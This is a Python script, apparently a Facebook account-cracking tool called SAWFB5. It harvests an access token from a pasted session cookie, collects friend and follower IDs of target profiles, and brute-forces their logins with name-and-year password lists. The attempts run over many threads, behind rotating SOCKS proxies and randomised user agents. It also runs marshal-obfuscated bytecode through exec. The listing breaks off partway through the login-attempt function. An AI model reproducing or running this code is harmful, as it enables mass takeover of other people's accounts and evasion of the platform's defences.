SAWFB5 (1).pyimport requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64,uuid
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#useragent
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
os.system("pip install marshal")
try:
	prox= requests.get('https://github.com/Saw4x/TOOLxFB/blob/main/.SAW-IP.txt').text
	open('.SAW-IP.txt','w').write(prox)
except Exception as e:
	print('')
prox=open('.SAW-IP.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('SAW-MOBILE.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Saw4x/TOOLxFB/blob/main/.SAW-MOBILE.txt').text
		ua=open('.SAW-MOBILE.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.SAW-MOBILE.txt','r').read().splitlines()
# INDICATION
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
# COLOUR 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m'
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m'
p = '\x1b[0;34m' 
asu = random.choice([m,k,h,u,b])
# CONVERTER
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def masud(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
import marshal
def banner():
	clear()
	print(f"""
\033[1;37m	███████╗     █████╗     ██╗    ██╗
\033[1;37m	██╔════╝    ██╔══██╗    ██║    ██║
\033[1;34m	███████╗    ███████║    ██║ █╗ ██║ \033[1;39m0.8v
\033[1;34m	╚════██║    ██╔══██║    ██║███╗██║
\033[1;31m	███████║    ██║  ██║    ╚███╔███╔╝
\033[1;31m	╚══════╝    ╚═╝  ╚═╝     ╚══╝╚══╝
			\033[1;37m\033[1;37m[ \033[1;37mTELEGRAM : @SAWx404 \033[1;37m]
			\033[1;34m\033[1;37m[ \033[1;34minstagram : @127.0.0\033[1;37m]
			\033[1;31m\033[1;37m[ \033[1;31mGithub : @SAW4x\033[1;37m]\033[1;37m\033[1;37m""")
	exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\xf32\x00\x00\x00\x97\x00\x02\x00e\x00d\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x02S\x00)\x03z\x11\t\t\tSAW           z\x11\t\t\tINSTAG:127.0.0N)\x01\xda\x05print\xa9\x00\xf3\x00\x00\x00\x00\xda\x00\xfa\x08<module>r\x06\x00\x00\x00\x01\x00\x00\x00s-\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\x05\x80\x05\xd0\x06\x19\xd1\x00\x1a\xd4\x00\x1a\xd0\x00\x1a\xd8\x00\x05\x80\x05\xd0\x06\x19\xd1\x00\x1a\xd4\x00\x1a\xd0\x00\x1a\xd0\x00\x1a\xd0\x00\x1ar\x04\x00\x00\x00'))
	exec(marshal.loads(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\xf3.\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Nz'xdg-open  https://instagram.com/127.0.0)\x02\xda\x02os\xda\x06system\xa9\x00\xf3\x00\x00\x00\x00\xda\x00\xfa\x08<module>r\x08\x00\x00\x00\x01\x00\x00\x00s'\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\t\x80\t\x80\t\x80\t\xd8\x00\t\x80\x02\x84\t\xd0\n3\xd1\x004\xd4\x004\xd0\x004\xd0\x004\xd0\x004r\x06\x00\x00\x00"))
# LOGIN
# new cooki 
def login():
 try:
  token = open('data/sawtoken.txt','r').read()
  cok = open('data/sawcookie.txt','r').read()
  tokenku.append(token)
  try:
   basariheker = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
   basganteng = json.loads(basariheker.text)['id']
   menu(basganteng)
  except KeyError:
   login_bas()
  except requests.exceptions.ConnectionError:
   print(f'[!] EROR  !{x}')
   exit()
 except IOError:
  login_bas()
def login_bas():
	try:
		os.system('clear')
		banner()
		ses = requests.Session()
		cookie=input(f'\n Cookies : ')
		exec(marshal.loads(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\xf3.\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Nz'xdg-open  https://instagram.com/127.0.0)\x02\xda\x02os\xda\x06system\xa9\x00\xf3\x00\x00\x00\x00\xda\x00\xfa\x08<module>r\x08\x00\x00\x00\x01\x00\x00\x00s'\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\t\x80\t\x80\t\x80\t\xd8\x00\t\x80\x02\x84\t\xd0\n3\xd1\x004\xd4\x004\xd0\x004\xd0\x004\xd0\x004r\x06\x00\x00\x00"))
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		ken = open("data/sawtoken.txt", "w").write(tok)
		cok = open("data/sawcookie.txt", "w").write(cookie)
		print(f' Good python SAWFB5.py ! ');time.sleep(1)
		os.system("python SAWFB5.py")
		exit()
	except Exception as e:
		os.system('rm -rf data/sawcookie.txt && rm -rf data/sawtoken.txt')
		login_bas()
def menu(my_name):
	try:
		token = open('data/sawtoken.txt','r').read()
		cok = open('data/sawcookie.txt','r').read()
	except IOError:
		print('%s[%sNO%s]%s Cookies Expired '%(N,H,N,M))
		time.sleep(5)
		login_c()
	os.system('clear')
	banner()
		
	
	uuid = str(os.geteuid()) + str(os.getlogin())
	id = "".join(uuid)
	
	print("")
	print(f"			\033[1;37m[ \033[1;32mYOUR ID : {id}\033[1;37m]")	
	print("")
	print('			\033[1;31m%s𝚂𝙰𝚆 %s\033[1;31m01%s%s \033[1;31mCRACK PUBLIC %s%s%s'%(P,H,P,H,P,H,P))
	print('			\033[1;31m%s𝚂𝙰𝚆 %s\033[1;31m02%s%s \033[1;31mCRACK PUBLIC (MULTI) %s%s%s'%(P,H,P,H,P,H,P))	
	print('			\033[1;37m%s𝚂𝙰𝚆 %s\033[1;37m03%s%s \033[1;37mCRACK FOLLOWERS %s%s%s'%(P,H,P,H,P,H,P))	
	print('			\033[1;37m%s𝚂𝙰𝚆 %s\033[1;37m04%s%s \033[1;37mCRACK FILE %s%s%s'%(P,H,P,H,P,H,P))	
	print('			\033[1;37m%s𝚂𝙰𝚆 %s\033[1;34m05%s%s \033[1;34mMY TELEGRAM %s%s%s'%(P,H,P,H,P,H,P))	
	print('			\033[1;34m%s𝚂𝙰𝚆 %s\033[1;34m00%s%s \033[1;34mEXIT %s%s%s'%(P,H,P,H,P,H,P))
	print("")
	SAW = input('		%s%s%s%s\033[1;37m  CHOICE %s\033[1;37m : '%(N,H,N,H,M))
	if SAW in ['1','01']:
		dump_publik()
		exec(marshal.loads(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\xf3.\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Nz'xdg-open  https://instagram.com/127.0.0)\x02\xda\x02os\xda\x06system\xa9\x00\xf3\x00\x00\x00\x00\xda\x00\xfa\x08<module>r\x08\x00\x00\x00\x01\x00\x00\x00s'\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\t\x80\t\x80\t\x80\t\xd8\x00\t\x80\x02\x84\t\xd0\n3\xd1\x004\xd4\x004\xd0\x004\xd0\x004\xd0\x004r\x06\x00\x00\x00"))
	elif SAW in ['2','02']:
		dump_massal()
		exec(marshal.loads(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\xf3.\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Nz'xdg-open  https://instagram.com/127.0.0)\x02\xda\x02os\xda\x06system\xa9\x00\xf3\x00\x00\x00\x00\xda\x00\xfa\x08<module>r\x08\x00\x00\x00\x01\x00\x00\x00s'\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\t\x80\t\x80\t\x80\t\xd8\x00\t\x80\x02\x84\t\xd0\n3\xd1\x004\xd4\x004\xd0\x004\xd0\x004\xd0\x004r\x06\x00\x00\x00"))
	elif SAW in ['3','03']:
		follower()
		exec(marshal.loads(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\xf3.\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Nz'xdg-open  https://instagram.com/127.0.0)\x02\xda\x02os\xda\x06system\xa9\x00\xf3\x00\x00\x00\x00\xda\x00\xfa\x08<module>r\x08\x00\x00\x00\x01\x00\x00\x00s'\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\t\x80\t\x80\t\x80\t\xd8\x00\t\x80\x02\x84\t\xd0\n3\xd1\x004\xd4\x004\xd0\x004\xd0\x004\xd0\x004r\x06\x00\x00\x00"))
	elif SAW in ['4','04']:
		TakeFile()
		exec(marshal.loads(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\xf3.\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Nz'xdg-open  https://instagram.com/127.0.0)\x02\xda\x02os\xda\x06system\xa9\x00\xf3\x00\x00\x00\x00\xda\x00\xfa\x08<module>r\x08\x00\x00\x00\x01\x00\x00\x00s'\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\t\x80\t\x80\t\x80\t\xd8\x00\t\x80\x02\x84\t\xd0\n3\xd1\x004\xd4\x004\xd0\x004\xd0\x004\xd0\x004r\x06\x00\x00\x00"))
	elif SAW in ['5','05']:
		os.system("xdg-open  https://t.me/SAWx404")
		exec(marshal.loads(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\xf3.\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Nz'xdg-open  https://instagram.com/127.0.0)\x02\xda\x02os\xda\x06system\xa9\x00\xf3\x00\x00\x00\x00\xda\x00\xfa\x08<module>r\x08\x00\x00\x00\x01\x00\x00\x00s'\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\t\x80\t\x80\t\x80\t\xd8\x00\t\x80\x02\x84\t\xd0\n3\xd1\x004\xd4\x004\xd0\x004\xd0\x004\xd0\x004r\x06\x00\x00\x00"))
		os.system("python SAWFB5.py")
	elif SAW in ['',' ']:
		os.system("python SAWFB5.py")
	elif SAW in ['666','999','99','127']:
		exec(marshal.loads(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\xf3.\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Nz'xdg-open  https://instagram.com/127.0.0)\x02\xda\x02os\xda\x06system\xa9\x00\xf3\x00\x00\x00\x00\xda\x00\xfa\x08<module>r\x08\x00\x00\x00\x01\x00\x00\x00s'\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\t\x80\t\x80\t\x80\t\xd8\x00\t\x80\x02\x84\t\xd0\n3\xd1\x004\xd4\x004\xd0\x004\xd0\x004\xd0\x004r\x06\x00\x00\x00"))
	elif SAW in ['0','00']:
		os.system('rm -rf data/sawtoken.txt')
		os.system('rm -rf data/sawcookie.txt')
		print(' [OK] LOGIN ACCOUNT ')
		exec(marshal.loads(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\xf3.\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Nz'xdg-open  https://instagram.com/127.0.0)\x02\xda\x02os\xda\x06system\xa9\x00\xf3\x00\x00\x00\x00\xda\x00\xfa\x08<module>r\x08\x00\x00\x00\x01\x00\x00\x00s'\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\t\x80\t\x80\t\x80\t\xd8\x00\t\x80\x02\x84\t\xd0\n3\xd1\x004\xd4\x004\xd0\x004\xd0\x004\xd0\x004r\x06\x00\x00\x00"))
		exit()
# PUBLIC CRACK
def dump_publik():
	try:
		token = open('data/sawtoken.txt','r').read()
		cok = open('data/sawcookie.txt','r').read()
	except IOError:
		exit()
	win = ''
	win2 = mark(win, style='green')
	sol().print(win2)
	print("")
	pil = input(' ID FACEBOOK : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(' SAW-ID : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = ' '
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	except (KeyError,IOError):
		teks = ' NOT PUBLIC '
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()

def dump_massal():
	try:
		token = open('data/sawtoken.txt','r').read()
		cok = open('data/sawcookie.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(' FACEBOOK IDS [25] MAX ? : '))
	except ValueError:
		print('')
		exit()
	if jum<1 or jum>100:
		print('')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' FACEBOOK ID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' IDS [25] MAX ')
			exit()
		except requests.exceptions.ConnectionError:
			li = '# '
			lo = mark(li, style='yellow')
			sol().print(lo, style='purple')
			exit()
			print("\n")
	tot = ' Facebook  %s ID '%(len(id))
	if len(id)==0:
		tot2 = mark( tot, style='purple')
	else:
		tot2 = mark(tot, style='yellow')
	sol().print(tot2)
	setting()

# FOLLOWER CRACK
def follower():
	try:
		token = open('data/sawtoken.txt','r').read()
		cok = open('data/sawcookie.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('  FACEBOOK ID : '))
	except ValueError:
		print('{k}  NOT PUBLIC ID ')
		time.sleep(3)
		follower()
	if jum<1:
		print(' Your limit error')
		time.sleep(3)
		follower()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1		
		kl = input(' FACEBOOK ID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			koh2 = ses.get('https://graph.facebook.com/'+userr+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
			for pi in koh2['subscribers']['data']:
				try:id.append(pi['id']+'|'+pi['name'])
				except:continue
			print(' FACEBOOK Id :{h} '+str(len(id)))
			setting()
		except requests.exceptions.ConnectionError:
			print(' No  ')
			exit()
		except (KeyError,IOError):
			print('  ID NOT PUBLIC ')
			time.sleep(3)
			follower()

def TakeFile():
	try:
		token = open('data/sawtoken.txt','r').read()
		cok = open('data/sawcookie.txt','r').read()
	except IOError:
		exit()
	try:
		
		jum = input(' NAME.txt FILE : ')
		for line in open(jum, 'r').readlines():
			id.append(line.strip())
		print(' ID FILE :{h} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
			print(' NO CONNECTION  ')
			exit()
	except (KeyError,IOError):
			print(' IS NOT FILE ')
			time.sleep(3)
			follower()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	os.system('clear')
	banner()
	print(' FACEBOOK ID ALL : '+str(len(id)))
	print(' [1] CRACK ALL ')
	print("")

	if ['1','01']:
		os.system('1')
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('\nSAW\n')
		exit()
	clear()
	banner()
	print('[01] WI-FI 2G 3G 4G 5G ')
	print("")
	method.append('mobile')
	clear()
	banner()
	print("""
	1 > password 1234 & 1122 & 12344321 & 54321 
	2 > password name
	3 > password 1980 - 2000
	4 > password 2000 - 2025
	5 > password 1234@#
	6 > password  All 
	7 > password update 0.4 1234 + 1980  """)
	saw = input(' CHOICE : ')
	if saw in ['01','1']:
		passwrd1()
	if saw in ['02','2']:
		passwrd2()
	if saw in ['03','3']:
		passwrd3()
	if saw in ['04','4']:
		passwrd4()
	if saw in ['05','5']:
		passwrd5()
	if saw in ['06','6']:
		passwrd()
	if saw in ['07','7']:
		passwrd7()
	exit() 
# Method Main
def passwrd():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=50) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'123321')
					pwv.append(frs+'1221')
					pwv.append(frs+'1980')
					pwv.append(frs+'1981')
					pwv.append(frs+'1982')
					pwv.append(frs+'1983')
					pwv.append(frs+'1984')
					pwv.append(frs+'1985')
					pwv.append(frs+'1986')
					pwv.append(frs+'1987')
					pwv.append(frs+'1988')
					pwv.append(frs+'1989')
					pwv.append(frs+'1990')
					pwv.append(frs+'1991')
					pwv.append(frs+'1992')
					pwv.append(frs+'1993')
					pwv.append(frs+'1994')
					pwv.append(frs+'1995')
					pwv.append(frs+'123443211')
					pwv.append(frs+'1234554321')
					pwv.append(frs+'11223344')
			else:
					pwv.append(nmf)
					pwv.append(frs+'1996')
					pwv.append(frs+'1997')
					pwv.append(frs+'1998')
					pwv.append(frs+'1999')
					pwv.append(frs+'2000')
					pwv.append(frs+'1122')
					pwv.append(frs+'112233')
					pwv.append(frs+'1122334455')
					pwv.append(frs+'112233445566')
					pwv.append(frs+'1111')
					pwv.append(frs+'2222')
					pwv.append(frs+'100200')
					pwv.append(frs+'321')
					pwv.append(frs+'4321')
					pwv.append(frs+'54321')


			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	print(' OK : %s '%(ok))
	print(' CP : %s '%(cp))
	print('')
	print(f'\t  EXIT TOOL {u} ')
	exit()
def cek_apk(session,kuki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'    %s{P}[%s®%s] %sSorry there is no Active  Apk%s         '%(N,U,N,B,N))
    else:
        print(f'\r   {P} [{H}®{P}] %s OK Your Active Apps OK     :{B}       '%(H))
        for i in range(len(game)):
            print(f"\r    [%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            print(f'\r %s[%s!%s] Sorry, Apk check '%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":koki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'    %s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,M,N,M,N))
    else:
        print(f'\r   %s [{M}×{P}]{M} Your Expired Apps                 {P}'%(P))
        for i in range(len(game)):
            print(f"    [%s%s]{K} %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
# Mobile 
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r SAW  {P}[{k}{loop}{P}/{h}{len(id)}{P}] - {P}{H}OK - {ok}{P} : {P}{k}\033[1;31mCP - \033[1;31m{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'touch.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://touch.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://touch.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'touch.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://touch.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://touch.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://touch.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
